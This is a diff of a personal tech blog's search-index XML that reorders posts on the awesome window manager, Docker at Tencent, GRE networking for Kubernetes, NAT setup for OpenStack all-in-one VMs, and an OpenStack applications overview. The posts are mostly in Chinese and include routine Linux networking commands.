@@ -1878,6 +1878,55 @@ Available Commands:
     </entry>
     
     <entry>
+      <title><![CDATA[awesome quick start]]></title>
+      <url>http://feisky.xyz/2015/03/19/awesome-quick-start/</url>
+      <content type="html"><![CDATA[<p>awesome是Linux平台出色的窗口管理器，具有速度快、界面简捷等优点。其安装也比较简单：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">sudo apt-get <span class="keyword">install</span> -y awesome awesome-extra gnome-<span class="keyword">settings</span>-daemon nautilus</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> -y <span class="comment">--no-install-recommends gnome-session</span></div><div class="line">mkdir -p ~/.config/awesome</div></pre></td></tr></table></figure>
+<p>常用快捷键整理：</p>
+<pre><code>切换程序
+切换到下一个程序：Mod4 + j
+切换到上一个程序：Mod4 + k
+切换到主窗口中的第一个程序：Mod4 + Ctrl + Return
+
+切换tag
+切换到上一个选择的tag：Mod4 + Esc
+切换到某个指定的tag：Mod4 + 1-9
+切换到前一个tag：Mod4 + Left
+切换到下一个tag：Mod4 + Right
+
+程序窗口状态修改
+最大化/非最大化：Mod4 + m
+浮动/平铺：Mod4 + Ctrl + Space
+最小化：Mod4 + n
+从最小化中恢复：Mod4 + Ctrl + n
+关闭程序：Mod4 + Shift + C
+
+程序窗口的转移和显示
+转移到某个tag：Mod4 + Shift + 1-9（或在某个tag名上按Mod4+鼠标左键）
+增加到某些tag：Mod4 + Shift + Ctrl + 1-9
+转移到下一个窗口中的位置：Mod4 + Shift + j
+转移到上一个窗口中的位置：Mod4 + Shift + k
+
+布局修改
+当前程序窗口宽度增加5％：Mod4 + Shift + h
+当前程序窗口宽度减少5％：Mod4 + Shift + l
+切换到下一种布局方式：Mod4 + Space
+切换到上一种布局方式：Mod4 + Ctrl + Space
+
+窗口管理
+重启awesome：Mod4 + Ctrl + r
+退出awesome：Mod4 + Shift + q
+运行某个命令：Mod4 + r
+打开awesome菜单：Mod4 + w
+
+多显示器下的操作
+切换到下一个屏幕：Mod4 + Ctrl + j
+切换到上一个屏幕：Mod4 + Ctrl + k
+将程序发送到下一个屏幕：Mod4 + o
+</code></pre>]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[docker in tencent]]></title>
       <url>http://feisky.xyz/2015/03/19/docker-in-tencent/</url>
       <content type="html"><![CDATA[<p>腾讯内部对Docker有着广泛的使用，其基于Yarn的代号为Gaia的调度平台可以同时兼容Docker和非Docker类型的应用，并提供高并发任务调度和资源管理，它具有高度可伸缩性和可靠性，能够支持MR等离线业务。</p>
@@ -1935,55 +1984,6 @@ Available Commands:
 <p>参考资料</p>
 <p><a href="http://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=205002587&amp;idx=1&amp;sn=2026ddb96e00b42762a8c8fb7717818e&amp;3rd=MzA3MDU4NTYzMw==&amp;scene=6#rd&amp;utm_source=tuicool" target="_blank" rel="external">InfoQ1</a><br><a href="http://www.infoq.com/cn/articles/tecent-bigdata-architecture" target="_blank" rel="external">InfoQ2</a></p>
 ]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[awesome quick start]]></title>
-      <url>http://feisky.xyz/2015/03/19/awesome-quick-start/</url>
-      <content type="html"><![CDATA[<p>awesome是Linux平台出色的窗口管理器，具有速度快、界面简捷等优点。其安装也比较简单：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">sudo apt-get <span class="keyword">install</span> -y awesome awesome-extra gnome-<span class="keyword">settings</span>-daemon nautilus</div><div class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> -y <span class="comment">--no-install-recommends gnome-session</span></div><div class="line">mkdir -p ~/.config/awesome</div></pre></td></tr></table></figure>
-<p>常用快捷键整理：</p>
-<pre><code>切换程序
-切换到下一个程序：Mod4 + j
-切换到上一个程序：Mod4 + k
-切换到主窗口中的第一个程序：Mod4 + Ctrl + Return
-
-切换tag
-切换到上一个选择的tag：Mod4 + Esc
-切换到某个指定的tag：Mod4 + 1-9
-切换到前一个tag：Mod4 + Left
-切换到下一个tag：Mod4 + Right
-
-程序窗口状态修改
-最大化/非最大化：Mod4 + m
-浮动/平铺：Mod4 + Ctrl + Space
-最小化：Mod4 + n
-从最小化中恢复：Mod4 + Ctrl + n
-关闭程序：Mod4 + Shift + C
-
-程序窗口的转移和显示
-转移到某个tag：Mod4 + Shift + 1-9（或在某个tag名上按Mod4+鼠标左键）
-增加到某些tag：Mod4 + Shift + Ctrl + 1-9
-转移到下一个窗口中的位置：Mod4 + Shift + j
-转移到上一个窗口中的位置：Mod4 + Shift + k
-
-布局修改
-当前程序窗口宽度增加5％：Mod4 + Shift + h
-当前程序窗口宽度减少5％：Mod4 + Shift + l
-切换到下一种布局方式：Mod4 + Space
-切换到上一种布局方式：Mod4 + Ctrl + Space
-
-窗口管理
-重启awesome：Mod4 + Ctrl + r
-退出awesome：Mod4 + Shift + q
-运行某个命令：Mod4 + r
-打开awesome菜单：Mod4 + w
-
-多显示器下的操作
-切换到下一个屏幕：Mod4 + Ctrl + j
-切换到上一个屏幕：Mod4 + Ctrl + k
-将程序发送到下一个屏幕：Mod4 + o
-</code></pre>]]></content>
     </entry>
     
     <entry>
@@ -2252,18 +2252,18 @@ gear link -n "127.0.0.1:3306:10.16.138.101:49153" server/application_container_1
     </entry>
     
     <entry>
-      <title><![CDATA[Linux kernel network call flow]]></title>
-      <url>http://feisky.xyz/2015/03/03/linux-kernel-network-call-flow/</url>
-      <content type="html"><![CDATA[<p><img src="/images/network_flow.jpg" alt=""></p>
-<p>Refer <a href="http://blog.csdn.net/night_elf_1020/article/details/19935813" target="_blank" rel="external">http://blog.csdn.net/night_elf_1020/article/details/19935813</a></p>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[OVS 2.0 call flow]]></title>
       <url>http://feisky.xyz/2015/03/03/ovs-20-call-flow/</url>
       <content type="html"><![CDATA[<p><img src="/images/ovs_flow.jpg" alt=""></p>
 <p>Refer <a href="http://blog.csdn.net/night_elf_1020/article/details/37600791" target="_blank" rel="external">http://blog.csdn.net/night_elf_1020/article/details/37600791</a></p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Linux kernel network call flow]]></title>
+      <url>http://feisky.xyz/2015/03/03/linux-kernel-network-call-flow/</url>
+      <content type="html"><![CDATA[<p><img src="/images/network_flow.jpg" alt=""></p>
+<p>Refer <a href="http://blog.csdn.net/night_elf_1020/article/details/19935813" target="_blank" rel="external">http://blog.csdn.net/night_elf_1020/article/details/19935813</a></p>
 ]]></content>
     </entry>
     
@@ -2290,12 +2290,12 @@ gear link -n "127.0.0.1:3306:10.16.138.101:49153" server/application_container_1
     </entry>
     
     <entry>
-      <title><![CDATA[Setting up GRE for Kubernetes]]></title>
-      <url>http://feisky.xyz/2015/03/01/setting-up-gre-for-kubernetes/</url>
-      <content type="html"><![CDATA[<p>首先修改Docker的默认网桥：</p>
-<figure class="highlight vala"><table><tr><td class="code"><pre><div class="line"><span class="meta">#停止Docker Daemon进程</span></div><div class="line">systemctl stop docker</div><div class="line"></div><div class="line"><span class="meta">#设置默认网桥docker0为down，并删除</span></div><div class="line">ip link <span class="keyword">set</span> dev docker0 down</div><div class="line">brctl delbr docker0</div><div class="line"></div><div class="line"><span class="meta">#新建Linux网桥localbr0</span></div><div class="line">brctl addbr localbr0</div><div class="line"></div><div class="line"><span class="meta">#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复</span></div><div class="line">ip addr add <span class="number">10.10</span><span class="number">.2</span><span class="number">.1</span>/<span class="number">24</span> dev localbr0</div><div class="line">ip link <span class="keyword">set</span> dev localbr0 up</div><div class="line"></div><div class="line">echo <span class="string">'OPTIONS="--bridge localbr0 --iptables=false"'</span>&gt;&gt;/etc/sysconfig/docker</div><div class="line">systemctl start Docker</div></pre></td></tr></table></figure>
-<p>为上述网桥添加GRE连接</p>
-<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line"><span class="comment">#新建Openvswitch网桥</span></div><div class="line">ovs-vsctl<span class="built_in"> add-br </span>ovsbr</div><div class="line"></div><div class="line"><span class="comment">#启用STP协议防止网桥环路</span></div><div class="line">ovs-vsctl set<span class="keyword"> bridge</span> ovsbr stp_enable=true</div><div class="line"></div><div class="line"><span class="comment">#添加ovsbr到本地localbr0，使得容器流量通过OVS流经GRE Tunnel</span></div><div class="line">brctl addif localbr0 ovsbr</div><div class="line">ip link set dev ovsbr up</div><div class="line"></div><div class="line"><span class="comment">#创建GRE</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr tep0 -- set interface tep0 type=internal</div><div class="line"></div><div class="line"><span class="comment">#需在每个主机上修改tep0 IP地址</span></div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.1/24 dev tep0</div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.2/24 dev tep0</div><div class="line">ip link set dev tep0 up</div><div class="line"></div><div class="line"><span class="comment">#使用GRE隧道连接每个主机上的Openvswitch网桥</span></div><div class="line"><span class="comment">#192.168.0.127</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.128</div><div class="line"></div><div class="line"><span class="comment">#192.168.0.128</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.127</div><div class="line"></div><div class="line"><span class="comment">#配置路由使得跨主机间容器的通信</span></div><div class="line">ip route<span class="built_in"> add </span>10.10.0.0/16 dev tep0</div><div class="line"></div><div class="line"><span class="comment">#为了使得容器访问Internet，在两台主机上配置NAT</span></div><div class="line">iptables -t nat -A POSTROUTING -s 10.10.0.0/16 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure>
+      <title><![CDATA[How enable OpenStack allinone vm to access external network]]></title>
+      <url>http://feisky.xyz/2015/03/01/how-enable-openstack-allinone-vm-to-access-external-network/</url>
+      <content type="html"><![CDATA[<p>首先需要为OpenStack添加一个公网网络，假设All-in-one环境建的公网网段为10.10.10.0/24，公网网关为10.10.10.1。这样为虚拟机绑定公网IP后，由于网关是不存在的，虚拟机无法访问外网。那虚拟机如果想访问外网怎么办呢？</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">#添加FAKE公网网关</div><div class="line">ovs-vsctl add-port br-ex gwp -- set interface gwp type=internal</div><div class="line">ifconfig gwp <span class="number">10.10</span>.<span class="number">10.1</span> netmask <span class="number">255.255</span>.<span class="number">255.0</span></div><div class="line">#添加SNAT规则允许虚拟机访问外网 </div><div class="line">iptables -t nat -A POSTROUTING -s <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span> -j MASQUERADE</div><div class="line">#允许转发，添加允许转发或者删除默认的REJECT规则都可以</div><div class="line"><span class="selector-id">#iptables</span> -D FORWARD -j REJECT --reject-with icmp-host-prohibited</div><div class="line">iptables -t <span class="attribute">filter</span> -I FORWARD -j ACCEPT</div><div class="line"></div><div class="line">#开启内核转发</div><div class="line">sysctl -w net<span class="selector-class">.ipv4</span><span class="selector-class">.conf</span><span class="selector-class">.eth0</span><span class="selector-class">.rp_filter</span>=<span class="number">0</span></div><div class="line">sysctl -w net<span class="selector-class">.ipv4</span><span class="selector-class">.conf</span><span class="selector-class">.gwp</span><span class="selector-class">.rp_filter</span>=<span class="number">0</span></div><div class="line">sysctl -w net<span class="selector-class">.ipv4</span><span class="selector-class">.ip_forward</span>=<span class="number">1</span></div></pre></td></tr></table></figure>
+<p>如果想从外部访问虚拟机的话，可以通过类似的方法将虚拟机的22端口映射到主机的eth0上来：</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><div class="line">#假设eth0的<span class="built_in">ip</span>地址为<span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span></div><div class="line">iptables -t nat -I OUTPUT -d <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span>/<span class="number">32</span> -p tcp -m tcp --dport <span class="number">2222</span> -j DNAT --to-destination <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.5</span>:<span class="number">22</span></div><div class="line">iptables -t nat -I FORWORD ! -i enp1s0f0 ! -o enp1s0f0 -m conntrack ! --ctstate DNAT -j ACCEPT</div><div class="line">iptables -t nat -I PREROUTING -d <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span>/<span class="number">32</span> -p tcp -m tcp --dport <span class="number">2222</span> -j DNAT --to-destination <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.5</span>:<span class="number">22</span></div><div class="line"></div><div class="line">#iptables -t nat -I POSTROUTING -s <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.5</span>/<span class="number">32</span> -p tcp -m tcp --sport <span class="number">2222</span> -j SNAT --to-source <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span>:<span class="number">22</span></div><div class="line">#iptables -t nat -I POSTROUTING -s <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.0</span>/<span class="number">24</span> -j SNAT --to-source <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span></div></pre></td></tr></table></figure>
 ]]></content>
     </entry>
     
@@ -2656,59 +2656,12 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
-      <title><![CDATA[How enable OpenStack allinone vm to access external network]]></title>
-      <url>http://feisky.xyz/2015/03/01/how-enable-openstack-allinone-vm-to-access-external-network/</url>
-      <content type="html"><![CDATA[<p>首先需要为OpenStack添加一个公网网络，假设All-in-one环境建的公网网段为10.10.10.0/24，公网网关为10.10.10.1。这样为虚拟机绑定公网IP后，由于网关是不存在的，虚拟机无法访问外网。那虚拟机如果想访问外网怎么办呢？</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">#添加FAKE公网网关</div><div class="line">ovs-vsctl add-port br-ex gwp -- set interface gwp type=internal</div><div class="line">ifconfig gwp <span class="number">10.10</span>.<span class="number">10.1</span> netmask <span class="number">255.255</span>.<span class="number">255.0</span></div><div class="line">#添加SNAT规则允许虚拟机访问外网 </div><div class="line">iptables -t nat -A POSTROUTING -s <span class="number">10.10</span>.<span class="number">10.0</span>/<span class="number">24</span> -j MASQUERADE</div><div class="line">#允许转发，添加允许转发或者删除默认的REJECT规则都可以</div><div class="line"><span class="selector-id">#iptables</span> -D FORWARD -j REJECT --reject-with icmp-host-prohibited</div><div class="line">iptables -t <span class="attribute">filter</span> -I FORWARD -j ACCEPT</div><div class="line"></div><div class="line">#开启内核转发</div><div class="line">sysctl -w net<span class="selector-class">.ipv4</span><span class="selector-class">.conf</span><span class="selector-class">.eth0</span><span class="selector-class">.rp_filter</span>=<span class="number">0</span></div><div class="line">sysctl -w net<span class="selector-class">.ipv4</span><span class="selector-class">.conf</span><span class="selector-class">.gwp</span><span class="selector-class">.rp_filter</span>=<span class="number">0</span></div><div class="line">sysctl -w net<span class="selector-class">.ipv4</span><span class="selector-class">.ip_forward</span>=<span class="number">1</span></div></pre></td></tr></table></figure>
-<p>如果想从外部访问虚拟机的话，可以通过类似的方法将虚拟机的22端口映射到主机的eth0上来：</p>
-<figure class="highlight x86asm"><table><tr><td class="code"><pre><div class="line">#假设eth0的<span class="built_in">ip</span>地址为<span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span></div><div class="line">iptables -t nat -I OUTPUT -d <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span>/<span class="number">32</span> -p tcp -m tcp --dport <span class="number">2222</span> -j DNAT --to-destination <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.5</span>:<span class="number">22</span></div><div class="line">iptables -t nat -I FORWORD ! -i enp1s0f0 ! -o enp1s0f0 -m conntrack ! --ctstate DNAT -j ACCEPT</div><div class="line">iptables -t nat -I PREROUTING -d <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span>/<span class="number">32</span> -p tcp -m tcp --dport <span class="number">2222</span> -j DNAT --to-destination <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.5</span>:<span class="number">22</span></div><div class="line"></div><div class="line">#iptables -t nat -I POSTROUTING -s <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.5</span>/<span class="number">32</span> -p tcp -m tcp --sport <span class="number">2222</span> -j SNAT --to-source <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span>:<span class="number">22</span></div><div class="line">#iptables -t nat -I POSTROUTING -s <span class="number">10.10</span><span class="meta">.10</span><span class="meta">.0</span>/<span class="number">24</span> -j SNAT --to-source <span class="number">192.168</span><span class="meta">.33</span><span class="meta">.22</span></div></pre></td></tr></table></figure>
-]]></content>
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Going Native with OpenStack Centric Applications: Overview]]></title>
-      <url>http://feisky.xyz/2015/02/25/going-native-with-openstack-centric-applications-overview/</url>
-      <content type="html"><![CDATA[<p>Cloud infrastructure is useless without applications running atop, providing business services and&nbsp;solving customer needs. So, as applications ascend to the throne as the rightful king of cloud, focus sharpens on their support within OpenStack-based clouds.&nbsp;With this focus, let’s walk through a survey of components and projects supporting applications in OpenStack, understanding what a&nbsp;day in the life of an application in OpenStack is like. We’ll start with an overview of the application ecosystem comprised of a number of supporting projects. In the ecosystem overview below, relevant OpenStack projects are presented in context of existing, similar technologies with which you may be familiar. These similar technologies both under and overlap functionality of the respective OpenStack project, but are shown to hasten your general&nbsp;understanding of which bucket these projects fall into by way of tech you may already know (so, add a pinch of salt when considering relevancy of suggested affiliated technologies).</p>
-<h3 id="Application-Ecosystem-by-Project"><a href="#Application-Ecosystem-by-Project" class="headerlink" title="Application Ecosystem by Project"></a>Application Ecosystem by Project</h3><p>Like individual lines in a product family, projects within OpenStack engulf and extend one another for related, but distinct purposes and target use cases. OpenStack developers are cautious to apply DRY principles in their approach to project design, integrating functionality rather than reinventing the wheel as they go. The <em>Project Focus and Relationship</em> diagram both figuratively and literally places project relationships into round bubbles, identifying conceptual starting points for the genesis of an application as well as the reuse of some projects by others.</p>
-<p><img src="/assets/OpenStack-Centric-Applications-Project-Focus-and-Relationship.png" alt=""></p>
-<ul>
-<li><p><strong>Application Blueprint Designer –&nbsp;<a href="https://wiki.openstack.org/wiki/Merlin" target="_blank" rel="external">Merlin</a></strong></p>
-<ul>
-<li>RavelloSystems, UrbanCode, CliQr, Prime Service Catalog*…</li>
-</ul>
-</li>
-<li><p><strong>Application Lifecycle Management PaaS – <a href="https://wiki.openstack.org/wiki/Solum" target="_blank" rel="external">Solum</a></strong></p>
-<ul>
-<li>Similar technologies (ALM) – Atlassian Suite, HP ALM, Cloudpipes, Serena…</li>
-<li>Similar technologies (PaaS) – Openshift, Cloud Foundry, BlueMix, AppScale, Heroku, App Engine…</li>
-</ul>
-</li>
-<li><p><strong>Application Catalog –&nbsp;<a href="https://wiki.openstack.org/wiki/Murano" target="_blank" rel="external">Murano</a></strong></p>
-<ul>
-<li>Similar technologies – AppStack, CliQr, ITApp, AppDirect…</li>
-</ul>
-</li>
-<li><p><strong>Application Stack Provisioning – <a href="https://wiki.openstack.org/wiki/Heat" target="_blank" rel="external">Heat</a>,&nbsp;Magnum</strong></p>
-<ul>
-<li>Similar technologies – AWS Elastic Beanstalk, Kubernetes, GearD, Warden, Fleet, MaestroNG, CliQr, Nirmata…</li>
-</ul>
-</li>
-<li><p><strong>Application Containers –&nbsp;<a href="https://wiki.openstack.org/wiki/Docker" target="_blank" rel="external">Docker</a></strong></p>
-<ul>
-<li>Similar technologies – OpenVZ, Linux V-Server, FreeBSD jails,&nbsp;AIX&nbsp;Workload Partitions&nbsp;and&nbsp;Solaris Containers</li>
-</ul>
-</li>
-<li><p><strong>Application Configuration Management – Puppet, Chef</strong></p>
-<ul>
-<li>Similar technologies – Heat, Salt, Ansible, <a href="https://wiki.openstack.org/wiki/Satori" target="_blank" rel="external">Satori</a>*…</li>
-</ul>
-</li>
-</ul>
-<h3 id="A-Day-in-the-Life-of-an-OpenStack-Native-Application"><a href="#A-Day-in-the-Life-of-an-OpenStack-Native-Application" class="headerlink" title="A Day in the Life of an OpenStack-Native Application"></a>A Day in the Life of an OpenStack-Native Application</h3><p>The <em>Application Lifecycle Flows</em> diagram defines different&nbsp;entrance points by which applications are birthed and the flow between different OpenStack projects within their lifecycle.</p>
-<p><img src="/assets/OpenStack-Centric-Applications-Application-Lifecycle-Flows.png" alt=""></p>
-<p>Users may&nbsp;<strong>design</strong> applications with Merlin,&nbsp;<strong>develop</strong>&nbsp;applications with Solum,&nbsp;<strong>order</strong> applications with Murano,&nbsp;<strong>deploy</strong> applications and resources with Heat and&nbsp;<strong>manage</strong> applications with Puppet/other configuration managers.</p>
-<h3 id="“Applications”"><a href="#“Applications”" class="headerlink" title="“Applications”"></a>“Applications”</h3><p>Given that applications are varied in nature both in terms of their type and complexity, let’s take a moment to review their possible shapes and sizes. With regard to types of applications, some are &nbsp;image-based and some are container-based while others are offered simply as a&nbsp;SaaS subscription (implying that a singular instance of this application may serve multiple tenants). Applications may be cloud-native (designed to be scaled out, highly distributed, service-oriented) or enterprise-architected (designed to be scaled up, designed with layers and functional domains). Application complexity ranges from single component (image or container) to multiple component, multiple environment, multiple OpenStack deployments to OpenStack and other systems. Applications may be comprised of multiple components (e.g. MySQL, PHP, Apache) or a singular components (MySQL). Application components may be distributed or contained within a given container, VM or cloud. With these possibilities in mind,&nbsp;let’s begin our survey of their support with the&nbsp;OpenStack-native application catalog – Murano in the next post in this series.</p>
-<p>From <a href="http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/" target="_blank" rel="external">http://blog.gingergeek.com/2014/11/going-native-with-openstack-centric-applications-overview/</a></p>
+      <title><![CDATA[Setting up GRE for Kubernetes]]></title>
+      <url>http://feisky.xyz/2015/03/01/setting-up-gre-for-kubernetes/</url>
+      <content type="html"><![CDATA[<p>首先修改Docker的默认网桥：</p>
+<figure class="highlight vala"><table><tr><td class="code"><pre><div class="line"><span class="meta">#停止Docker Daemon进程</span></div><div class="line">systemctl stop docker</div><div class="line"></div><div class="line"><span class="meta">#设置默认网桥docker0为down，并删除</span></div><div class="line">ip link <span class="keyword">set</span> dev docker0 down</div><div class="line">brctl delbr docker0</div><div class="line"></div><div class="line"><span class="meta">#新建Linux网桥localbr0</span></div><div class="line">brctl addbr localbr0</div><div class="line"></div><div class="line"><span class="meta">#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复</span></div><div class="line">ip addr add <span class="number">10.10</span><span class="number">.2</span><span class="number">.1</span>/<span class="number">24</span> dev localbr0</div><div class="line">ip link <span class="keyword">set</span> dev localbr0 up</div><div class="line"></div><div class="line">echo <span class="string">'OPTIONS="--bridge localbr0 --iptables=false"'</span>&gt;&gt;/etc/sysconfig/docker</div><div class="line">systemctl start Docker</div></pre></td></tr></table></figure>
+<p>为上述网桥添加GRE连接</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line"><span class="comment">#新建Openvswitch网桥</span></div><div class="line">ovs-vsctl<span class="built_in"> add-br </span>ovsbr</div><div class="line"></div><div class="line"><span class="comment">#启用STP协议防止网桥环路</span></div><div class="line">ovs-vsctl set<span class="keyword"> bridge</span> ovsbr stp_enable=true</div><div class="line"></div><div class="line"><span class="comment">#添加ovsbr到本地localbr0，使得容器流量通过OVS流经GRE Tunnel</span></div><div class="line">brctl addif localbr0 ovsbr</div><div class="line">ip link set dev ovsbr up</div><div class="line"></div><div class="line"><span class="comment">#创建GRE</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr tep0 -- set interface tep0 type=internal</div><div class="line"></div><div class="line"><span class="comment">#需在每个主机上修改tep0 IP地址</span></div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.1/24 dev tep0</div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.2/24 dev tep0</div><div class="line">ip link set dev tep0 up</div><div class="line"></div><div class="line"><span class="comment">#使用GRE隧道连接每个主机上的Openvswitch网桥</span></div><div class="line"><span class="comment">#192.168.0.127</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.128</div><div class="line"></div><div class="line"><span class="comment">#192.168.0.128</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.127</div><div class="line"></div><div class="line"><span class="comment">#配置路由使得跨主机间容器的通信</span></div><div class="line">ip route<span class="built_in"> add </span>10.10.0.0/16 dev tep0</div><div class="line"></div><div class="line"><span class="comment">#为了使得容器访问Internet，在两台主机上配置NAT</span></div><div class="line">iptables -t nat -A POSTROUTING -s 10.10.0.0/16 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure>
 ]]></content>
     </entry>
     
@@ -2888,6 +2841,53 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
+      <title><![CDATA[Going Native with OpenStack Centric Applications: Overview]]></title>
+      <url>http://feisky.xyz/2015/02/25/going-native-with-openstack-centric-applications-overview/</url>
+      <content type="html"><![CDATA[<p>Cloud infrastructure is useless without applications running atop, providing business services and&nbsp;solving customer needs. So, as applications ascend to the throne as the rightful king of cloud, focus sharpens on their support within OpenStack-based clouds.&nbsp;With this focus, let’s walk through a survey of components and projects supporting applications in OpenStack, understanding what a&nbsp;day in the life of an application in OpenStack is like. We’ll start with an overview of the application ecosystem comprised of a number of supporting projects. In the ecosystem overview below, relevant OpenStack projects are presented in context of existing, similar technologies with which you may be familiar. These similar technologies both under and overlap functionality of the respective OpenStack project, but are shown to hasten your general&nbsp;understanding of which bucket these projects fall into by way of tech you may already know (so, add a pinch of salt when considering relevancy of suggested affiliated technologies).</p>
+<h3 id="Application-Ecosystem-by-Project"><a href="#Application-Ecosystem-by-Project" class="headerlink" title="Application Ecosystem by Project"></a>Application Ecosystem by Project</h3><p>Like individual lines in a product family, projects within OpenStack engulf and extend one another for related, but distinct purposes and target use cases. OpenStack developers are cautious to apply DRY principles in their approach to project design, integrating functionality rather than reinventing the wheel as they go. The <em>Project Focus and Relationship</em> diagram both figuratively and literally places project relationships into round bubbles, identifying conceptual starting points for the genesis of an application as well as the reuse of some projects by others.</p>
+<p><img src="/assets/OpenStack-Centric-Applications-Project-Focus-and-Relationship.png" alt=""></p>
+<ul>
+<li><p><strong>Application Blueprint Designer –&nbsp;<a href="https://wiki.openstack.org/wiki/Merlin" target="_blank" rel="external">Merlin</a></strong></p>
+<ul>
+<li>RavelloSystems, UrbanCode, CliQr, Prime Service Catalog*…</li>
+</ul>
+</li>
+<li><p><strong>Application Lifecycle Management PaaS – <a href="https://wiki.openstack.org/wiki/Solum" target="_blank" rel="external">Solum</a></strong></p>
+<ul>
+<li>Similar technologies (ALM) – Atlassian Suite, HP ALM, Cloudpipes, Serena…</li>
+<li>Similar technologies (PaaS) – Openshift, Cloud Foundry, BlueMix, AppScale, Heroku, App Engine…</li>
+</ul>
+</li>
+<li><p><strong>Application Catalog –&nbsp;<a href="https://wiki.openstack.org/wiki/Murano" target="_blank" rel="external">Murano</a></strong></p>
+<ul>
+<li>Similar technologies – AppStack, CliQr, ITApp, AppDirect…</li>
+</ul>
+</li>
+<li><p><strong>Application Stack Provisioning – <a href="https://wiki.openstack.org/wiki/Heat" target="_blank" rel="external">Heat</a>,&nbsp;Magnum</strong></p>
+<ul>
+<li>Similar technologies – AWS Elastic Beanstalk, Kubernetes, GearD, Warden, Fleet, MaestroNG, CliQr, Nirmata…</li>
+</ul>
+</li>
+<li><p><strong>Application Containers –&nbsp;<a href="https://wiki.openstack.org/wiki/Docker" target="_blank" rel="external">Docker</a></strong></p>
+<ul>
+<li>Similar technologies – OpenVZ, Linux V-Server, FreeBSD jails,&nbsp;AIX&nbsp;Workload Partitions&nbsp;and&nbsp;Solaris Containers</li>
+</ul>
+</li>
+<li><p><strong>Application Configuration Management – Puppet, Chef</strong></p>
+<ul>
+<li>Similar technologies – Heat, Salt, Ansible, <a href="https://wiki.openstack.org/wiki/Satori" target="_blank" rel="external">Satori</a>*…</li>
+</ul>
+</li>
+</ul>
+<h3 id="A-Day-in-the-Life-of-an-OpenStack-Native-Application"><a href="#A-Day-in-the-Life-of-an-OpenStack-Native-Application" class="headerlink" title="A Day in the Life of an OpenStack-Native Application"></a>A Day in the Life of an OpenStack-Native Application</h3><p>The <em>Application Lifecycle Flows</em> diagram defines different&nbsp;entrance points by which applications are birthed and the flow between different OpenStack projects within their lifecycle.</p>
+<p><img src="/assets/OpenStack-Centric-Applications-Application-Lifecycle-Flows.png" alt=""></p>
+<p>Users may&nbsp;<strong>design</strong> applications with Merlin,&nbsp;<strong>develop</strong>&nbsp;applications with Solum,&nbsp;<strong>order</strong> applications with Murano,&nbsp;<strong>deploy</strong> applications and resources with Heat and&nbsp;<strong>manage</strong> applications with Puppet/other configuration managers.</p>
+<h3 id="“Applications”"><a href="#“Applications”" class="headerlink" title="“Applications”"></a>“Applications”</h3><p>Given that applications are varied in nature both in terms of their type and complexity, let’s take a moment to review their possible shapes and sizes. With regard to types of applications, some are &nbsp;image-based and some are container-based while others are offered simply as a&nbsp;SaaS subscription (implying that a singular instance of this application may serve multiple tenants). Applications may be cloud-native (designed to be scaled out, highly distributed, service-oriented) or enterprise-architected (designed to be scaled up, designed with layers and functional domains). Application complexity ranges from single component (image or container) to multiple component, multiple environment, multiple OpenStack deployments to OpenStack and other systems. Applications may be comprised of multiple components (e.g. MySQL, PHP, Apache) or a singular components (MySQL). Application components may be distributed or contained within a given container, VM or cloud. With these possibilities in mind,&nbsp;let’s begin our survey of their support with the&nbsp;OpenStack-native application catalog – Murano in the next post in this series.</p>
